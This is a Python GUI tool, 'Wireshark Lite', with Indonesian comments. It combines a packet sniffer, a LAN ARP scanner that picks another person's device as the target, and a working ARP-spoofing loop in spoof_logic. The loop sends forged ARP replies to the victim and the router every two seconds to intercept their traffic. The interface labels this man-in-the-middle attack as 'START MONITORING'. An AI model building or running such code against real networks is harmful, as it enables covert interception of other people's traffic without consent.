import tkinter as tk
from tkinter import ttk, messagebox
import threading
import socket
import time
import sniffer_core
from scapy.all import ARP, Ether, srp, conf, send, get_if_addr

class WiresharkLite:
    def __init__(self, root):
        self.root = root
        self.root.title("Wireshark Lite")
        self.root.geometry("1000x750")
        
        # Kontrol State
        self.stop_event = threading.Event()
        self.is_running = False
        self.is_spoofing = False
        self.packet_history = {} 

        # --- UI SETUP ---
        # 1. Atas: Kontrol Sniffer Utama
        control_frame = tk.Frame(root)
        control_frame.pack(pady=10, fill=tk.X)

        self.btn_start = tk.Button(control_frame, text="START SNIFFER", bg="green", fg="white", width=15, command=self.toggle_sniffing)
        self.btn_start.pack(side=tk.LEFT, padx=10)

        self.btn_clear = tk.Button(control_frame, text="CLEAR SCREEN", bg="orange", width=15, command=self.clear_table)
        self.btn_clear.pack(side=tk.LEFT, padx=5)

        tk.Label(control_frame, text="Filter Protocol:").pack(side=tk.LEFT, padx=(15, 0))
        self.filter_var = tk.StringVar(value="ALL")
        combo = ttk.Combobox(control_frame, textvariable=self.filter_var, values=["ALL", "TCP", "UDP", "ICMP"], width=10, state="readonly")
        combo.pack(side=tk.LEFT, padx=5)

        # 2. Bawah: Panel Monitoring (Scanner & Auto-Detect Router)
        spoof_frame = tk.LabelFrame(root, text=" Network Radar (Auto-Detect & Monitor) ", padx=10, pady=10)
        spoof_frame.pack(padx=10, pady=5, fill=tk.X)

        self.btn_scan = tk.Button(spoof_frame, text="1. SCAN & DETECT", bg="purple", fg="white", width=15, command=self.scan_network)
        self.btn_scan.pack(side=tk.LEFT, padx=5)

        tk.Label(spoof_frame, text="IP Orang:").pack(side=tk.LEFT, padx=(10, 0))
        self.target_ip_entry = tk.Entry(spoof_frame, width=15)
        self.target_ip_entry.pack(side=tk.LEFT, padx=5)

        tk.Label(spoof_frame, text="IP Router:").pack(side=tk.LEFT, padx=(10, 0))
        self.router_ip_entry = tk.Entry(spoof_frame, width=15)
        self.router_ip_entry.pack(side=tk.LEFT, padx=5)

        self.btn_spoof = tk.Button(spoof_frame, text="2. START MONITORING", bg="blue", fg="white", command=self.toggle_spoofing)
        self.btn_spoof.pack(side=tk.LEFT, padx=20)

        # 3. Tengah: Tabel Utama
        columns = ("no", "src", "dst", "proto", "len")
        self.tree = ttk.Treeview(root, columns=columns, show="headings")
        self.tree.heading("no", text="No")
        self.tree.heading("src", text="Source IP")
        self.tree.heading("dst", text="Destination IP")
        self.tree.heading("proto", text="Protocol")
        self.tree.heading("len", text="Length (Bytes)")
        self.tree.column("no", width=50, anchor="center")
        self.tree.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        self.tree.bind("<Double-1>", self.on_double_click)
        self.pkt_count = 0

    # --- FITUR AUTO-DETECT & SCAN ---
    def scan_network(self):
        self.btn_scan.config(text="Scanning...", state=tk.DISABLED)
        threading.Thread(target=self._run_scan_logic, daemon=True).start()

    def _run_scan_logic(self):
        try:
            # AUTO-DETECT ROUTER IP
            router_ip = conf.route.route("0.0.0.0")[2]
            self.router_ip_entry.delete(0, tk.END)
            self.router_ip_entry.insert(0, router_ip)

            # SCAN DEVICES
            my_ip = get_if_addr(conf.iface)
            ip_range = ".".join(my_ip.split('.')[:-1]) + ".0/24"
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, verbose=False)
            
            scan_win = tk.Toplevel(self.root)
            scan_win.title("Pilih Perangkat Orang")
            lb = tk.Listbox(scan_win, width=50, height=15)
            lb.pack(padx=10, pady=10)
            
            for _, rcv in ans:
                lb.insert(tk.END, f"IP: {rcv.psrc} | MAC: {rcv.hwsrc}")

            def select_ip():
                try:
                    selected = lb.get(lb.curselection())
                    self.target_ip_entry.delete(0, tk.END)
                    self.target_ip_entry.insert(0, selected.split(" ")[1])
                    scan_win.destroy()
                except: messagebox.showwarning("Pilih", "Silakan pilih salah satu IP!")

            tk.Button(scan_win, text="Gunakan Sebagai Target", command=select_ip, bg="green", fg="white").pack(pady=5)
        except Exception as e:
            messagebox.showerror("Error", f"Gagal Scan: {e}")
        finally:
            self.btn_scan.config(text="1. SCAN & DETECT", state=tk.NORMAL)

    # --- LOGIKA ARP SPOOFING ---
    def spoof_logic(self, target, router):
        while self.is_spoofing:
            send(ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=router), verbose=False)
            send(ARP(op=2, pdst=router, hwdst="ff:ff:ff:ff:ff:ff", psrc=target), verbose=False)
            time.sleep(2)

    def toggle_spoofing(self):
        if not self.is_spoofing:
            target, router = self.target_ip_entry.get(), self.router_ip_entry.get()
            if not target or not router: return messagebox.showerror("Error", "IP Target/Router Kosong!")
            self.is_spoofing = True
            self.btn_spoof.config(text="STOP MONITORING", bg="red")
            threading.Thread(target=self.spoof_logic, args=(target, router), daemon=True).start()
        else:
            self.is_spoofing = False
            self.btn_spoof.config(text="2. START MONITORING", bg="blue")

    # --- SNIFFER LOGIC ---
    def on_double_click(self, event):
        item_id = self.tree.selection()[0]
        data = self.packet_history[item_id]
        detail_win = tk.Toplevel(self.root)
        detail_win.title(f"Packet Detail #{self.tree.item(item_id)['values'][0]}")
        text_area = tk.Text(detail_win, padx=10, pady=10, font=("Consolas", 10))
        text_area.pack(fill=tk.BOTH, expand=True)
        try: hostname = socket.gethostbyaddr(data['dst'])[0]
        except: hostname = "Unknown Host"
        info = f"SOURCE: {data['src']}\nDEST: {data['dst']} ({hostname})\nPROTO: {data['proto']}\n"
        info += "-"*30 + "\n" + data['raw_pkt'].show(dump=True)
        text_area.insert(tk.END, info)
        text_area.config(state=tk.DISABLED)

    def add_to_table(self, data):
        self.pkt_count += 1
        item_id = self.tree.insert("", tk.END, values=(self.pkt_count, data['src'], data['dst'], data['proto'], data['len']))
        self.packet_history[item_id] = data
        self.tree.yview_moveto(1)

    def toggle_sniffing(self):
        if not self.is_running:
            self.is_running = True
            self.stop_event.clear()
            self.btn_start.config(text="STOP SNIFFER", bg="red")
            threading.Thread(target=self.run_sniffer, daemon=True).start()
        else:
            self.is_running = False
            self.stop_event.set()
            self.btn_start.config(text="START SNIFFER", bg="green")

    def run_sniffer(self):
        try: sniffer_core.start_sniffing(self.add_to_table, self.stop_event, self.filter_var.get())
        except Exception as e: messagebox.showerror("Error", str(e)); self.is_running = False

    def clear_table(self):
        for item in self.tree.get_children(): self.tree.delete(item)
        self.packet_history.clear(); self.pkt_count = 0

if __name__ == "__main__":
    root = tk.Tk()
    app = WiresharkLite(root)
    root.mainloop()